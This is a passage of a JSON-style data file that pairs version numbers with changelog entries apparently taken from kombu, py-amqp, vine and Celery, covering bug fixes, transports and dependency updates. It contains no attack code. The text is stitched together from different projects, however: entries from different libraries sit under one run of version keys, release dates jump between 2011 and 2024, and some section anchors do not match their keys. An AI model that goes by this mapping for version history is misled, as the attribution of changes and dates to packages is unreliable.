read.\n\n    This is to support eventloops where other things\n    must be handled between draining events.\n\n.. _version-2.1.8:\n\n", "2.1.4": "=====\n:release-date: 2012-04-03 04:00 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB:  URL parsing are now delegated to the pymongo library\n  (Fixes Issue 103 and Issue 87).\n\n    Fix contributed by Flavio Percoco Premoli and James Sullivan\n\n* SQS:  A bug caused SimpleDB to be used even if sdb persistence\n  was not enabled (Issue 108).\n\n    Fix contributed by Anand Kumria.\n\n* Django:  Transaction was committed in the wrong place, causing\n  data cleanup to fail (Issue 115).\n\n    Fix contributed by Daisuke Fujiwara.\n\n* MongoDB: Now supports replica set URLs.\n\n    Contributed by Flavio Percoco Premoli.\n\n* Redis: Now raises a channel error if a queue key that is currently\n  being consumed from disappears.\n\n    Fix contributed by Stephan Jaekel.\n\n* All transport 'channel_errors' lists now includes\n  ``kombu.exception.StdChannelError``.\n\n* All kombu exceptions now inherit from a common\n  :exc:`~kombu.exceptions.KombuError`.\n\n.. _version-2.1.3:\n\n", "2.1.3": "=====\n:release-date: 2012-03-20 03:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes Jython compatibility issues.\n\n* Fixes Python 2.5 compatibility issues.\n\n.. _version-2.1.2:\n\n", "2.1.2": "=====\n:release-date: 2012-03-01 01:00 P.M GMT\n:release-by: Ask Solem\n\n* amqplib: Last version broke SSL support.\n\n.. _version-2.1.1:\n\n", "2.1.1": "=====\n:release-date: 2012-02-24 02:00 P.M GMT\n:release-by: Ask Solem\n\n* Connection URLs now supports encoded characters.\n\n* Fixed a case where connection pool could not recover from connection loss.\n\n    Fix contributed by Florian Munz.\n\n* We now patch amqplib's ``__del__`` method to skip trying to close the socket\n  if it is not connected, as this resulted in an annoying warning.\n\n* Compression can now be used with binary message payloads.\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.1.0:\n\n", "2.1.0": "=====\n:release-date: 2012-02-04 10:38 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB: Now supports fanout (broadcast) (Issue 98).\n\n    Contributed by Scott Lyons.\n\n* amqplib: Now detects broken connections by using ``MSG_PEEK``.\n\n* pylibrabbitmq: Now supports ``basic_get`` (Issue 97).\n\n* gevent: Now always uses the ``select`` polling backend.\n\n* pika transport: Now works with pika 0.9.5 and 0.9.6dev.\n\n    The old pika transport (supporting 0.5.x) is now available\n    as alias ``oldpika``.\n\n    (Note terribly latency has been experienced with the new pika\n    versions, so this is still an experimental transport).\n\n* Virtual transports: can now set polling interval via the\n  transport options (Issue 96).\n\n    Example:\n\n    .. code-block:: pycon\n\n        >>> Connection('sqs://', transport_options={\n        ...     'polling_interval': 5.0})\n\n    The default interval is transport specific, but usually\n    1.0s (or 5.0s for the Django database transport, which\n    can also be set using the ``KOMBU_POLLING_INTERVAL`` setting).\n\n* Adds convenience function: :func:`kombu.common.eventloop`.\n\n.. _version-2.0.0:\n\n", "2.0.3": "=====\n:release-date: 2016-07-11 08:00 P.M PDT\n:release-by: Ask Solem\n\n- SSLTransport: Fixed crash \"no attribute sslopts\" when ``ssl=True``\n  (Issue 100).\n\n- Fixed incompatible argument spec for ``Connection.Close`` (Issue 45).\n\n    This caused the RabbitMQ server to raise an exception (INTERNAL ERROR).\n\n- Transport: No longer implements `__del__` to make sure gc can collect\n  connections.\n\n    It's the responsibility of the caller to close connections, this was\n    simply a relic from the amqplib library.\n\n.. _version-2.0.2:\n\n", "2.0.2": "=====\n:release-date: 2016-06-10 5:40 P.M PDT\n:release-by: Ask Solem\n\n- Python 3: Installation requirements ended up being a generator\n  and crashed setup.py.\n\n    Fix contributed by ChangBo Guo(gcb).\n\n- Python <= 2.7.7: struct.pack arguments cannot be unicode\n\n    Fix contributed by Alan Justino and Xin Li.\n\n- Python 3.4: Fixed use of `bytes % int`.\n\n    Fix contributed by Alan Justino.\n\n- Connection/Transport: Fixed handling of default port.\n\n    Fix contributed by Quentin Pradet.\n\n.. _version-2.0.1:\n\n", "2.0.1": "=====\n:release-date: 2016-05-31 6:20 P.M PDT\n:release-by: Ask Solem\n\n- Adds backward compatibility layer for the 1.4 API.\n\n    Using the connection without calling ``.connect()`` first will now work,\n    but a warning is emitted and the behavior is deprecated and will be\n    removed in version 2.2.\n\n- Fixes kombu 3.0/celery 3.1 compatibility (Issue 88).\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed compatibility with Python 2.7.3 (Issue 85)\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed bug where calling drain_events() with a timeout of 0 would actually\n  block until a frame is received.\n\n- Documentation moved to http://amqp.readthedocs.io (Issue #89).\n\n    See https://blog.readthedocs.com/securing-subdomains/ for the reasoning\n    behind this change.\n\n    Fix contributed by Adam Chainz.\n\n.. _version-2.0.0:\n\n", "2.0.0": "=====\n:release-date: 2012-01-15 06:34 P.M GMT\n:release-by: Ask Solem\n\n.. _v200-important:\n\nImportant Notes\n---------------\n\n.. _v200-python-compatibility:\n\nPython Compatibility\n~~~~~~~~~~~~~~~~~~~~\n\n* No longer supports Python 2.4.\n\n    Users of Python 2.4 can still use the 1.x series.\n\n    The 1.x series has entered bugfix-only maintenance mode, and will\n    stay that way as long as there is demand, and a willingness to\n    maintain it.\n\n\n.. _v200-new-transports:\n\nNew Transports\n~~~~~~~~~~~~~~\n\n* ``django-kombu`` is now part of Kombu core.\n\n    The Django message transport uses the Django ORM to store messages.\n\n    It uses polling, with a default polling interval of 5 seconds.\n    The polling interval can be increased or decreased by configuring the\n    ``KOMBU_POLLING_INTERVAL`` Django setting, which is the polling\n    interval in seconds as an int or a float.  Note that shorter polling\n    intervals can cause extreme strain on the database: if responsiveness\n    is needed you shall consider switching to a non-polling transport.\n\n    To use it you must use transport alias ``\"django\"``,\n    or as a URL:\n\n    .. code-block:: text\n\n        django://\n\n    and then add ``kombu.transport.django`` to ``INSTALLED_APPS``, and\n    run ``manage.py syncdb`` to create the necessary database tables.\n\n    **Upgrading**\n\n    If you have previously used ``django-kombu``, then the entry\n    in ``INSTALLED_APPS`` must be changed from ``djkombu``\n    to ``kombu.transport.django``:\n\n    .. code-block:: python\n\n        INSTALLED_APPS = (\n             \u2026,\n            'kombu.transport.django',\n        )\n\n    If you have previously used django-kombu, then there is no need\n    to recreate the tables, as the old tables will be fully compatible\n    with the new version.\n\n* ``kombu-sqlalchemy`` is now part of Kombu core.\n\n    This change requires no code changes given that the\n    ``sqlalchemy`` transport alias is used.\n\n.. _v200-news:\n\nNews\n----\n\n* :class:`kombu.mixins.ConsumerMixin` is a mixin class that lets you\n  easily write consumer programs and threads.\n\n  See :ref:`examples` and :ref:`guide-consumers`.\n\n* SQS Transport: Added support for SQS queue prefixes (Issue 84).\n\n    The queue prefix can be set using the transport option\n    ``queue_name_prefix``:\n\n    .. code-block:: python\n\n        BrokerTransport('SQS://', transport_options={\n            'queue_name_prefix': 'myapp'})\n\n    Contributed by Nitzan Miron.\n\n* ``Producer.publish`` now supports automatic retry.\n\n    Retry is enabled by the ``reply`` argument, and retry options\n    set by the ``retry_policy`` argument:\n\n    .. code-block:: python\n\n        exchange = Exchange('foo')\n        producer.publish(message, exchange=exchange, retry=True,\n                         declare=[exchange], retry_policy={\n                            'interval_start': 1.0})\n\n    See :meth:`~kombu.Connection.ensure`\n    for a list of supported retry policy options.\n\n* ``Producer.publish`` now supports a ``declare`` keyword argument.\n\n    This is a list of entities (:class:`Exchange`, or :class:`Queue`)\n    that should be declared before the message is published.\n\n.. _v200-fixes:\n\nFixes\n-----\n\n* Redis transport: Timeout was multiplied by 1000 seconds when using\n  ``select`` for event I/O (Issue 86).\n\n.. _version-1.5.1:\n\n", "1.4.9": "=====\n:release-date: 2016-01-08 5:50 P.M PST\n:release-by: Ask Solem\n\n- Fixes compatibility with Linux/macOS instances where the ``ctypes`` module\n  does not exist.\n\n    Fix contributed by Jared Lewis.\n\n.. _version-1.4.8:\n\n", "1.4.8": "=====\n:release-date: 2015-12-07 12:25 A.M\n:release-by: Ask Solem\n\n- ``abstract_channel.wait`` now accepts a float `timeout` parameter expressed\n    in seconds\n\n    Contributed by Goir.\n\n.. _version-1.4.7:\n\n", "1.4.7": "=====\n:release-date: 2015-10-02 05:30 P.M PDT\n:release-by: Ask Solem\n\n- Fixed libSystem error on macOS 10.11 (El Capitan)\n\n    Fix contributed by Eric Wang.\n\n- ``channel.basic_publish`` now raises :exc:`amqp.exceptions.NotConfirmed` on\n    ``basic.nack``.\n\n- AMQP timestamps received are now converted from GMT instead of local time\n    (Issue 67).\n\n- Wheel package installation now supported by both Python 2 and Python3.\n\n    Fix contributed by R\u00e9my Greinhofer.\n\n.. _version-1.4.6:\n\n", "1.4.6": "=====\n:release-date: 2014-08-11 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Now keeps buffer when socket times out.\n\n    Fix contributed by Artyom Koval.\n\n- Adds ``Connection.Transport`` attribute that can be used to specify\n  a different transport implementation.\n\n    Contributed by Yury Selivanov.\n\n.. _version-1.4.5:\n\n", "1.4.5": "=====\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Can now deserialize more AMQP types.\n\n    Now handles types ``short string``, ``short short int``,\n    ``short short unsigned int``, ``short int``,  ``short unsigned int``,\n    ``long unsigned int``,  ``long long int``, ``long long unsigned int``\n    and ``float`` which for some reason was missing, even in the original\n    amqplib module.\n\n- SSL: Workaround for Python SSL bug.\n\n    A bug in the python socket library causes ``ssl.read/write()``\n    on a closed socket to raise :exc:`AttributeError` instead of\n    :exc:`IOError`.\n\n    Fix contributed by Craig Jellick.\n\n- ``Transport.__del_`` now handles errors occurring at late interpreter\n  shutdown (Issue 36).\n\n.. _version-1.4.4:\n\n", "1.4.4": "=====\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- SSL transport accidentally disconnected after read timeout.\n\n    Fix contributed by Craig Jellick.\n\n.. _version-1.4.3:\n\n", "1.4.3": "=====\n:release-date: 2011-10-27 10:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes bug in ProducerPool where too many resources would be acquired.\n\n.. _version-1.4.2:\n\n", "1.4.2": "=====\n:release-date: 2011-10-26 05:00 P.M BST\n:release-by: Ask Solem\n\n* Eventio: Polling should ignore `errno.EINTR`\n\n* SQS: str.encode did only start accepting kwargs after Py2.7.\n\n* simple_task_queue example didn't run correctly (Issue 72).\n\n    Fix contributed by Stefan Eletzhofer.\n\n* Empty messages would not raise an exception not able to be handled\n  by `on_decode_error` (Issue 72)\n\n    Fix contributed by Christophe Chauvet.\n\n* CouchDB: Properly authenticate if user/password set (Issue 70)\n\n    Fix contributed by Rafael Duran Castaneda\n\n* Connection.Consumer had the wrong signature.\n\n    Fix contributed by Pavel Skvazh\n\n.. _version-1.4.1:\n\n", "1.4.1": "=====\n:release-date: 2011-09-26 04:00 P.M BST\n:release-by: Ask Solem\n\n* 1.4.0 broke the producer pool, resulting in new connections being\n  established for every acquire.\n\n\n.. _version-1.4.0:\n\n", "1.4.0": "=====\n:release-date: 2011-09-22 05:00 P.M BST\n:release-by: Ask Solem\n\n* Adds module :mod:`kombu.mixins`.\n\n    This module contains a :class:`~kombu.mixins.ConsumerMixin` class\n    that can be used to easily implement a message consumer\n    thread that consumes messages from one or more\n    :class:`kombu.Consumer` instances.\n\n* New example: :ref:`task-queue-example`\n\n    Using the ``ConsumerMixin``, default channels and\n    the global connection pool to demonstrate new Kombu features.\n\n* MongoDB transport did not work with MongoDB >= 2.0 (Issue 66)\n\n    Fix contributed by James Turk.\n\n* Redis-py version check did not account for beta identifiers\n  in version string.\n\n    Fix contributed by David Ziegler.\n\n* Producer and Consumer now accepts a connection instance as the\n  first argument.\n\n    The connections default channel will then be used.\n\n    In addition shortcut methods has been added to Connection:\n\n    .. code-block:: pycon\n\n        >>> connection.Producer(exchange)\n        >>> connection.Consumer(queues=..., callbacks=...)\n\n* Connection has aquired a ``connected`` attribute that\n  can be used to check if the connection instance has established\n  a connection.\n\n* ``ConnectionPool.acquire_channel`` now returns the connections\n  default channel rather than establising a new channel that\n  must be manually handled.\n\n* Added ``kombu.common.maybe_declare``\n\n    ``maybe_declare(entity)`` declares an entity if it has\n    not previously been declared in the same process.\n\n* :func:`kombu.compat.entry_to_queue` has been moved to :mod:`kombu.common`\n\n* New module :mod:`kombu.clocks` now contains an implementation\n  of Lamports logical clock.\n\n.. _version-1.3.5:\n\n", "1.3.3": "=====\n:release-date: 2011-09-15 02:00 P.M BST\n:release-by: Ask Solem\n\n* pools.reset did not support after forker arguments.\n\n.. _version-1.3.2:\n\n", "1.3.2": "=====\n:release-date: 2011-09-10 01:00 P.M BST\n:release-by: Mher Movsisyan\n\n* Broke Python 2.5 compatibility by importing ``parse_qsl`` from ``urlparse``\n\n* Connection.default_channel is now closed when connection is revived\n  after connection failures.\n\n* Pika: Channel now supports the ``connection.client`` attribute\n  as required by the simple interface.\n\n* pools.set_limit now raises an exception if the limit is lower\n  than the previous limit.\n\n* pools.set_limit no longer resets the pools.\n\n.. _version-1.3.1:\n\n", "1.3.1": "=====\n:release-date: 2011-10-07 03:00 P.M BST\n:release-by: Ask Solem\n\n* Last release broke after fork for pool reinitialization.\n\n* Producer/Consumer now has a ``connection`` attribute,\n  giving access to the :class:`Connection` of the\n  instance.\n\n* Pika: Channels now have access to the underlying\n  :class:`Connection` instance using ``channel.connection.client``.\n\n    This was previously required by the ``Simple`` classes and is now\n    also required by :class:`Consumer` and :class:`Producer`.\n\n* Connection.default_channel is now closed at object revival.\n\n* Adds kombu.clocks.LamportClock.\n\n* compat.entry_to_queue has been moved to new module :mod:`kombu.common`.\n\n.. _version-1.3.0:\n\n", "1.3.0": "=====\n:release-date: 2019-03-19 11:00 A.M UTC+2\n:release-by: Omer Katz\n\n- Added the option to ignore the result of a function and simply\n  call the callback without arguments.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.2.0:\n\n", "1.2.1": "=====\n:release-date: 2011-07-29 12:52 P.M BST\n:release-by: Ask Solem\n\n* Now depends on amqplib >= 1.0.0.\n\n* Redis: Now automatically deletes auto_delete queues at ``basic_cancel``.\n\n* ``serialization.unregister`` added so it is possible to remove unwanted\n  seralizers.\n\n* Fixes MemoryError while importing ctypes on SELinux (Issue 52).\n\n* ``Connection.autoretry`` is a version of ``ensure`` that works\n  with arbitrary functions (i.e. it does not need an associated object\n  that implements the ``revive`` method.\n\n  Example usage:\n\n  .. code-block:: python\n\n        channel = connection.channel()\n        try:\n            ret, channel = connection.autoretry(send_messages, channel=channel)\n        finally:\n            channel.close()\n\n* ``ConnectionPool.acquire`` no longer force establishes the connection.\n\n    The connection will be established as needed.\n\n* ``Connection.ensure`` now supports an ``on_revive`` callback\n  that is applied whenever the connection is re-established.\n\n* ``Consumer.consuming_from(queue)`` returns True if the Consumer is\n  consuming from ``queue``.\n\n* ``Consumer.cancel_by_queue`` did not remove the queue from ``queues``.\n\n* ``compat.ConsumerSet.add_queue_from_dict`` now automatically declared\n  the queue if ``auto_declare`` set.\n\n.. _version-1.2.0:\n\n", "1.2.0": "=====\n:release-date: 2018-01-06 4:30 P.M UTC+2\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Jon Dufresne** & **:github_user:`dequis`**\n\n- Handle bound methods in weak reference promise instances.\n\n  Contributed by **George Psarakis**\n\nDocumentation fixes, CI adjustments and cleanups by:\n\n- **Omer Katz**\n- **Jon Dufresne**\n- **Edward Betts**\n- **Jacopo Notarstefano**\n- **Christopher Hoskin**\n- **Fahad Siddiqui**\n\n.. _version-1.1.4:\n\n", "1.1.0": "=====\n:release-date: 2016-04-21 01:30 P.M PDT\n:release-by: Ask Solem\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now passes partial\n  args/kwargs to the errback:\n\n    .. code-block:: pycon\n\n        >>> p = promise(args=(self,), on_error=handle_error)\n        >>> p.throw(exc)   --> handle_error(self, exc)\n\n- New :class:`vine.abstract.ThenableProxy` can be used to add\n  promise-capabilities to a class by forwarding to a different promise.\n\n    .. code-block:: python\n\n        from vine import promise\n        from vine.abstract import ThenableProxy\n\n        class P(ThenableProxy):\n\n            def __init__(self, on_success=None, on_error=None):\n                self._set_promise_target(promise(\n                    args=(self,), callback=on_success, on_error=on_error,\n                ))\n\n        p = P()\n        p.then(download_file(url)).then(extract_file)\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now supports a propagate\n  argument that can be set to False to never reraise the exception.\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now also reraises the\n  current exception from the stack, if the exc argument is passed and that\n  value is the same as the current exception.\n\n- :meth:`Thenable.register() <vine.abstract.Thenable.register>` can now be\n  used as a decorator.\n\n- Argument to :meth:`promise.throw1(exc) <vine.promises.promise.throw1>` can now be\n  :const:`None` to use the current exception.\n\n- ``monotonic()`` now uses ``librt.so.0`` as an alternative if ``librt.so.1``\n  does not exist.\n\n    Contributed by Fahad Siddiqui.\n\n.. _version-1.0.2:\n\n", "1.0.13": "======\n:release-date: 2013-07-31 04:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed problems with the SSL transport (Issue 15).\n\n    Fix contributed by Adrien Guinet.\n\n- Small optimizations\n\n.. _version-1.0.12:\n\n", "1.0.12": "======\n:release-date: 2013-06-25 02:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed another Python 3 compatibility problem.\n\n.. _version-1.0.11:\n\n", "1.0.11": "======\n:release-date: 2013-04-11 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/transport.py``.\n\n.. _version-1.0.10:\n\n", "1.0.10": "======\n:release-date: 2013-03-21 03:30 P.M UTC\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/serialization.py``.\n  (Issue 11).\n\n.. _version-1.0.9:\n\n", "1.0.9": "=====\n:release-date: 2013-03-08 10:40 A.M UTC\n:release-by: Ask Solem\n\n- Publisher ack callbacks should now work after typo fix (Issue 9).\n\n- ``channel(explicit_id)`` will now claim that id from the array\n  of unused channel ids.\n\n- Fixes Jython compatibility.\n\n.. _version-1.0.8:\n\n", "1.0.8": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed SyntaxError on Python 2.5\n\n.. _version-1.0.7:\n\n", "1.0.7": "=====\n:release-date: 2011-03-28 05:45 P.M CEST\n:release-by: Ask Solem\n\n* Now depends on anyjson 0.3.1\n\n    cjson is no longer a recommended json implementation, and anyjson\n    will now emit a deprecation warning if used.\n\n* Please note that the Pika backend only works with version 0.5.2.\n\n    The latest version (0.9.x) drastically changed API, and it is not\n    compatible yet.\n\n* on_decode_error is now called for exceptions in message_to_python\n  (Issue 24).\n\n* Redis: did not respect QoS settings.\n\n* Redis: Creating a connection now ensures the connection is established.\n\n    This means ``Connection.ensure_connection`` works properly with\n    Redis.\n\n* consumer_tag argument to ``Queue.consume`` can't be :const:`None`\n  (Issue 21).\n\n    A None value is now automatically converted to empty string.\n    An empty string will make the server generate a unique tag.\n\n* Connection now supports a ``transport_options`` argument.\n\n    This can be used to pass additional arguments to transports.\n\n* Pika: ``drain_events`` raised :exc:`socket.timeout` even if no timeout\n  set (Issue 8).\n\n.. version-1.0.6:\n\n", "1.0.6": "=====\n:release-date: 2011-03-22 04:00 P.M CET\n:release-by: Ask Solem\n\n* The ``delivery_mode`` aliases (persistent/transient) were not automatically\n  converted to integer, and would cause a crash if using the amqplib\n  transport.\n\n* Redis: The redis-py :exc:`InvalidData` exception suddenly changed name to\n  :exc:`DataError`.\n\n* The :envvar:`KOMBU_LOG_DEBUG` environment variable can now be set to log all\n  channel method calls.\n\n  Support for the following environment variables have been added:\n\n    * :envvar:`KOMBU_LOG_CHANNEL` will wrap channels in an object that\n      logs every method call.\n\n    * :envvar:`KOMBU_LOG_DEBUG` both enables channel logging and configures the\n      root logger to emit messages to standard error.\n\n    **Example Usage**:\n\n    .. code-block:: console\n\n        $ KOMBU_LOG_DEBUG=1 python\n        >>> from kombu import Connection\n        >>> conn = Connection()\n        >>> channel = conn.channel()\n        Start from server, version: 8.0, properties:\n            {u'product': 'RabbitMQ',..............  }\n        Open OK! known_hosts []\n        using channel_id: 1\n        Channel open\n        >>> channel.queue_declare('myq', passive=True)\n        [Kombu channel:1] queue_declare('myq', passive=True)\n        (u'myq', 0, 1)\n\n.. _version-1.0.5:\n\n", "1.0.5": "=====\n:release-date: 2011-03-17 04:00 P.M CET\n:release-by: Ask Solem\n\n* Fixed memory leak when creating virtual channels.  All virtual transports\n  affected (redis, mongodb, memory, django, sqlalchemy, couchdb, beanstalk).\n\n* Virtual Transports: Fixed potential race condition when acking messages.\n\n    If you have been affected by this, the error would show itself as an\n    exception raised by the OrderedDict implementation. (``object no longer\n    exists``).\n\n* MongoDB transport requires the ``findandmodify`` command only available in\n  MongoDB 1.3+, so now raises an exception if connected to an incompatible\n  server version.\n\n* Virtual Transports: ``basic.cancel`` should not try to remove unknown\n  consumer tag.\n\n.. _version-1.0.4:\n\n", "1.0.4": "=====\n:release-date: 2011-02-28 04:00 P.M CET\n:release-by: Ask Solem\n\n* Added Transport.polling_interval\n\n    Used by django-kombu to increase the time to sleep between SELECTs when\n    there are no messages in the queue.\n\n    Users of django-kombu should upgrade to django-kombu v0.9.2.\n\n.. _version-1.0.3:\n\n", "1.0.3": "=====\n:release-date: 2011-02-12 04:00 P.M CET\n:release-by: Ask Solem\n\n* ConnectionPool: Re-connect if amqplib connection closed\n\n* Adds ``Queue.as_dict`` + ``Exchange.as_dict``.\n\n* Copyright headers updated to include 2011.\n\n.. _version-1.0.2:\n\n", "1.0.2": "=====\n:release-date: 2016-04-11 05:30 P.M PDT\n:release-by: Ask Solem\n\n- ``promise.throw()`` now supports second ``traceback`` argument to\n  throw exception with specific traceback.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-1.0.1:\n\n", "1.0.1": "=====\n:release-date: 2016-04-11 03:00 P.M PDT\n:release-by: Ask Solem\n\n- Adds vine.five.python_2_unicode_compatible.\n\n.. _version-1.0.0:\n\n", "1.0.0": "=====\n:release-date: 2016-04-07 06:02 P.M PDT\n:release-by: Ask Solem\n\n- Initial release.\n\n\n Change log\n\n", "0.9.4": "=============\n\n- Adds support for ``exchange_bind`` and ``exchange_unbind``.\n\n    Contributed by Rumyana Neykova\n\n- Fixed bugs in funtests and demo scripts.\n\n    Contributed by Rumyana Neykova\n\n.. _version-0.9.3:\n\n", "0.9.3": "=============\n\n- Fixed bug that could cause the consumer to crash when reading\n  large message payloads asynchronously.\n\n- Serialization error messages now include the invalid value.\n\n.. _version-0.9.2:\n\n", "0.9.2": "=============\n\n- Consumer cancel notification support was broken (Issue 1)\n\n    Fix contributed by Andrew Grangaard\n\n.. _version-0.9.1:\n\n", "0.9.1": "=============\n\n- Supports draining events from multiple channels (``Connection.drain_events``)\n- Support for timeouts\n- Support for heartbeats\n    - ``Connection.heartbeat_tick(rate=2)`` must called at regular intervals\n      (half of the heartbeat value if rate is 2).\n    - Or some other scheme by using ``Connection.send_heartbeat``.\n- Supports RabbitMQ extensions:\n    - Consumer Cancel Notifications\n        - by default a cancel results in ``ChannelError`` being raised\n        - but not if a ``on_cancel`` callback is passed to ``basic_consume``.\n    - Publisher confirms\n        - ``Channel.confirm_select()`` enables publisher confirms.\n        - ``Channel.events['basic_ack'].append(my_callback)`` adds a callback\n          to be called when a message is confirmed. This callback is then\n          called with the signature ``(delivery_tag, multiple)``.\n- Support for ``basic_return``\n- Uses AMQP 0-9-1 instead of 0-8.\n    - ``Channel.access_request`` and ``ticket`` arguments to methods\n      **removed**.\n    - Supports the ``arguments`` argument to ``basic_consume``.\n    - ``internal`` argument to ``exchange_declare`` removed.\n    - ``auto_delete`` argument to ``exchange_declare`` deprecated\n    - ``insist`` argument to ``Connection`` removed.\n    - ``Channel.alerts`` has been removed.\n    - Support for ``Channel.basic_recover_async``.\n    - ``Channel.basic_recover`` deprecated.\n- Exceptions renamed to have idiomatic names:\n    - ``AMQPException`` -> ``AMQPError``\n    - ``AMQPConnectionException`` -> ConnectionError``\n    - ``AMQPChannelException`` -> ChannelError``\n    - ``Connection.known_hosts`` removed.\n    - ``Connection`` no longer supports redirects.\n    - ``exchange`` argument to ``queue_bind`` can now be empty\n      to use the \"default exchange\".\n- Adds ``Connection.is_alive`` that tries to detect\n  whether the connection can still be used.\n- Adds ``Connection.connection_errors`` and ``.channel_errors``,\n  a list of recoverable errors.\n- Exposes the underlying socket as ``Connection.sock``.\n- Adds ``Channel.no_ack_consumers`` to keep track of consumer tags\n  that set the no_ack flag.\n- Slightly better at error recovery\n\n\n.. _changelog:\n\n================\n Change history\n================\n\n.. _version-5.4.0rc3:\n\n", "5.4.0rc3": "========\n:release-date: 22 July, 2024\n:release-by: Tomer Nosrati\n\n- Fixed typo in Changelog for v5.4.0rc2 (2057)\n- Use logging.Logger.warning (2058)\n- Pin zstandard to latest version 0.23.0 (2060)\n- Update mypy to 1.11.0 (2062)\n- Update pytest to 8.3.1 (2063)\n- SQS: add support for passing MessageAttributes (2059)\n\n.. _version-5.4.0rc2:\n\n", "5.4.0rc2": "========\n\n:release-date: 2024-03-27\n:release-by: Tomer Nosrati\n\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n- Update elasticsearch requirement from <=8.11.1 to <=8.12.0 (8810)\n- Update elastic-transport requirement from <=8.11.0 to <=8.12.0 (8811)\n- Update cryptography to 42.0.0 (8814)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- Update cryptography to 42.0.1 (8817)\n- Limit moto to <5.0.0 until the breaking issues are fixed (8820)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- Add a Task class specialised for Django (8491)\n- Sync kombu versions in requirements and setup.cfg (8825)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Update cryptography to 42.0.2 (8827)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Support moto 5.0 (8838)\n- Another fix for `link_error` signatures being `dict`s instead of `Signature` s (8841)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Upgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (8843)\n- Bump pytest from 7.4.4 to 8.0.0 (8823)\n- Update pre-commit to 3.6.1 (8839)\n- Update cryptography to 42.0.3 (8854)\n- Bump pytest from 8.0.0 to 8.0.1 (8855)\n- Update cryptography to 42.0.4 (8864)\n- Update pytest to 8.0.2 (8870)\n- Update cryptography to 42.0.5 (8869)\n- Update elasticsearch requirement from <=8.12.0 to <=8.12.1 (8867)\n- Eliminate consecutive chords generated by group | task upgrade (8663)\n- Make custom remote control commands available in CLI (8489)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Update pytest to 8.1.0 (8886)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Update pytest to 8.1.1 (8901)\n- Update contributing guide to use ssh upstream url (8881)\n- Fix recursive result parents on group in middle of chain (8903)\n- Bump pytest-celery to 1.0.0b4 (8899)\n- Adjusted smoke tests CI time limit (8907)\n- Update pytest-rerunfailures to 14.0 (8910)\n- Use the \"all\" extra for pytest-celery (8911)\n- Fix typos and grammar (8915)\n- Bump pytest-celery to 1.0.0rc1 (8918)\n- Print safe_say() to stdout for non-error flows (8919)\n- Update pytest-cov to 5.0.0 (8924)\n- Bump pytest-celery to 1.0.0rc2 (8928)\n\n.. _version-5.4.0rc1:\n\n", "5.4.0rc1": "========\n\n:release-date: 2024-01-17 7:00 P.M GMT+2\n:release-by: Tomer Nosrati\n\n", "5.3.7": "=====\n:release-date: 11 April, 2024\n:release-by: Tomer Nosrati\n\nThe release of v5.3.6 was missing the bumbversion commit so v5.3.7 is only released to sync it back.\n\n.. _version-5.3.6:\n\n", "5.3.6": "=====\n\n:release-date: 2023-11-22  9:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\nThis release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. \nThe code changes are mostly fix for regressions. More details can be found below.\n\n- Increased docker-build CI job timeout from 30m -> 60m (8635)\n- Incredibly minor spelling fix. (8649)\n- Fix non-zero exit code when receiving remote shutdown (8650)\n- Update task.py get_custom_headers missing 'compression' key (8633)\n- Update kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (8646)\n- test requirements version update (8655)\n- Update elasticsearch version (8656)\n- Propagates more ImportErrors during autodiscovery (8632)\n\n.. _version-5.3.5:\n\n", "5.3.5": "=====\n\n:release-date: 2023-11-10  7:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Update test.txt versions (8481)\n- fix os.getcwd() FileNotFoundError (8448)\n- Fix typo in CONTRIBUTING.rst (8494)\n- typo(doc): configuration.rst (8484)\n- assert before raise (8495)\n- Update GHA checkout version (8496)\n- Fixed replaced_task_nesting (8500)\n- Fix code indentation for route_task() example (8502)\n- support redis 5.x (8504)\n- Fix typos in test_canvas.py (8498)\n- Marked flaky tests (8508)\n- Fix typos in calling.rst (8506)\n- Added support for replaced_task_nesting in chains (8501)\n- Fix typos in canvas.rst (8509)\n- Patch Version Release Checklist (8488)\n- Added Python 3.11 support to Dockerfile (8511)\n- Dependabot (Celery) (8510)\n- Bump actions/checkout from 3 to 4 (8512)\n- Update ETA example to include timezone (8516)\n- Replaces datetime.fromisoformat with the more lenient dateutil parser (8507)\n- Fixed indentation in Dockerfile for Python 3.11 